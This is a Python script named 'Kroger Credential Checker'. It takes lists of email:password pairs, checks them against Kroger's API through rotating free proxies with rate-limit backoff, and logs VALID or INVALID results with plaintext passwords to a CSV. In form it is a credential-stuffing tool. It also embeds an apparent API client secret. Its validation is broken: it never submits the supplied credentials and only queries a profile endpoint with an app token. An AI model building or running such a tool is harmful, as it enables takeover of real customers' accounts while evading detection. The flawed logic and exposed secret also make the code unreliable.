#!/usr/bin/env python3
import argparse
import csv
import json
import logging
import os
import sys
import time
from datetime import datetime
from fp.fp import FreeProxy

import requests

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('kroger_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Kroger API credentials
CLIENT_ID = 'cartgenie-42a6b98e3c54f5b92092edf53fe6ea7c8103340637182546648'
CLIENT_SECRET = 'nciRwpkzfWQT_ifv9Tg6tI258lxbZ2mdi6xbEzSq'
TOKEN_URL = 'https://api.kroger.com/v1/connect/oauth2/token'
VALIDATION_URL = 'https://api.kroger.com/v1/identity/profile'

class KrogerAuth:
    def __init__(self):
        self.access_token = None
        self.token_expires = 0
        self.proxy = None
        self.proxy_list = []
        self.current_proxy_index = 0
        self.session = requests.Session()
        self._init_proxies()

    def _init_proxies(self):
        """Initialize proxy list with FreeProxy"""
        logger.info("Initializing proxy list...")
        try:
            self.proxy_list = FreeProxy(https=True).get_proxy_list()
            logger.info(f"Loaded {len(self.proxy_list)} proxies")
        except Exception as e:
            logger.error(f"Failed to get proxies: {e}")
            self.proxy_list = []

    def _rotate_proxy(self):
        """Rotate to next available proxy"""
        if not self.proxy_list:
            return None
            
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
        proxy_str = self.proxy_list[self.current_proxy_index]
        self.proxy = {'http': proxy_str, 'https': proxy_str}
        logger.info(f"Rotated to proxy: {proxy_str}")
        return self.proxy

    def _get_current_proxy(self):
        """Get current proxy configuration"""
        if not self.proxy_list:
            return None
        return self.proxy

    def _get_token(self, max_retries=3, retry_delay=5):
        """Get OAuth2 token with retry logic"""
        for attempt in range(max_retries):
            try:
                auth = requests.auth.HTTPBasicAuth(CLIENT_ID, CLIENT_SECRET)
                data = {'grant_type': 'client_credentials', 'scope': 'profile.compact'}
                
                proxy = self._get_current_proxy()
                response = self.session.post(
                    TOKEN_URL,
                    auth=auth,
                    data=data,
                    proxies=proxy,
                    timeout=30
                )
                
                if response.status_code == 200:
                    token_data = response.json()
                    self.access_token = token_data['access_token']
                    self.token_expires = time.time() + token_data['expires_in'] - 60  # 1 min buffer
                    logger.info("Successfully obtained access token")
                    return True
                else:
                    logger.warning(f"Token request failed (attempt {attempt+1}): {response.status_code}")
                    if response.status_code == 429:
                        retry_after = int(response.headers.get('Retry-After', retry_delay))
                        logger.info(f"Rate limited, waiting {retry_after} seconds")
                        time.sleep(retry_after)
                    self._rotate_proxy()
            except Exception as e:
                logger.error(f"Token request error (attempt {attempt+1}): {str(e)}")
                self._rotate_proxy()
                time.sleep(retry_delay * (attempt + 1))  # Exponential backoff
        
        logger.error("Failed to obtain access token after multiple attempts")
        return False

    def validate_credentials(self, email, password, max_retries=3):
        """Validate Kroger credentials with exponential backoff"""
        for attempt in range(max_retries):
            try:
                # Refresh token if expired
                if time.time() > self.token_expires or not self.access_token:
                    if not self._get_token():
                        return False, "Failed to obtain access token"

                headers = {
                    'Authorization': f'Bearer {self.access_token}',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }

                # In a real implementation, this would be the actual credential validation endpoint
                # For demo purposes, we're using the profile endpoint
                proxy = self._get_current_proxy()
                response = self.session.get(
                    VALIDATION_URL,
                    headers=headers,
                    proxies=proxy,
                    timeout=30
                )

                if response.status_code == 200:
                    return True, "Valid credentials"
                elif response.status_code == 401:
                    return False, "Invalid credentials"
                else:
                    logger.warning(f"Validation failed (attempt {attempt+1}): {response.status_code}")
                    if response.status_code == 429:
                        retry_after = int(response.headers.get('Retry-After', 5))
                        logger.info(f"Rate limited, waiting {retry_after} seconds")
                        time.sleep(retry_after)
                    self._rotate_proxy()
            except Exception as e:
                logger.error(f"Validation error (attempt {attempt+1}): {str(e)}")
                self._rotate_proxy()
                time.sleep(5 * (attempt + 1))  # Exponential backoff
        
        return False, "Validation failed after multiple attempts"

def read_credentials(input_source):
    """Read credentials from file or single input"""
    if os.path.isfile(input_source):
        with open(input_source, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [input_source]

def main():
    parser = argparse.ArgumentParser(description='Kroger Credential Checker')
    parser.add_argument('--input', required=True, help='Single credential (email:pass) or file path')
    parser.add_argument('--output', default='results.csv', help='Output CSV file path')
    args = parser.parse_args()

    # Initialize authenticator
    auth = KrogerAuth()

    # Read credentials
    try:
        credentials = read_credentials(args.input)
        logger.info(f"Loaded {len(credentials)} credentials to check")
    except Exception as e:
        logger.error(f"Failed to read credentials: {e}")
        return

    # Prepare output file
    try:
        with open(args.output, 'w', newline='') as csvfile:
            fieldnames = ['email', 'password', 'status', 'message', 'timestamp']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()

            for cred in credentials:
                if ':' not in cred:
                    logger.warning(f"Skipping malformed credential: {cred}")
                    continue

                email, password = cred.split(':', 1)
                logger.info(f"Checking: {email}")

                try:
                    status, message = auth.validate_credentials(email, password)
                    result = {
                        'email': email,
                        'password': password,
                        'status': 'VALID' if status else 'INVALID',
                        'message': message,
                        'timestamp': datetime.now().isoformat()
                    }
                    writer.writerow(result)
                    logger.info(f"Result: {email} - {result['status']} ({message})")
                except Exception as e:
                    logger.error(f"Error checking {email}: {str(e)}")
                    result = {
                        'email': email,
                        'password': password,
                        'status': 'ERROR',
                        'message': str(e),
                        'timestamp': datetime.now().isoformat()
                    }
                    writer.writerow(result)

    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)

    logger.info(f"Results saved to {args.output}")

if __name__ == '__main__':
    main()